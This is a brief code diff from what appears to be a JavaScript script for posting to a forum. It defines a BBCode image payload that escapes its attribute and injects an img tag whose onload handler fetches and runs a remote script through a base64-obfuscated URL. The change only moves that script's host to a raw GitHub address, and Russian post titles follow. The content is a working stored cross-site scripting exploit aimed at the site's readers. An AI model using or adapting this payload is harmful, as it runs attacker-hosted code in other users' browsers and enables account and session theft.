@@ -2,7 +2,7 @@
 
 $('div.fr-element.fr-view').html('<p></p>')
 
-const payload = `[IMG=alt=undefined]https://lztcdn.com/files/c037dc47ffcd55ae4fa009653a39e0fa284494c7fac84616a30d81fef81eb9e7.webp?d="/><img src=x onload=$.getScript(atob("aHR0cHM6Ly93aGl0ZWhhdC1hMDE1ZC53ZWIuYXBwL2Zyb2dneS5qcw=="))>[/IMG]`
+const payload = `[IMG=alt=undefined]https://lztcdn.com/files/c037dc47ffcd55ae4fa009653a39e0fa284494c7fac84616a30d81fef81eb9e7.webp?d="/><img src=x onload=$.getScript(atob("aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL1p5bmFraWxsL2hhd2NoaWsvbWFpbi9mcm9nZ3kuanM="))>[/IMG]`
 
 const title = [
   'зачем это добавили?',
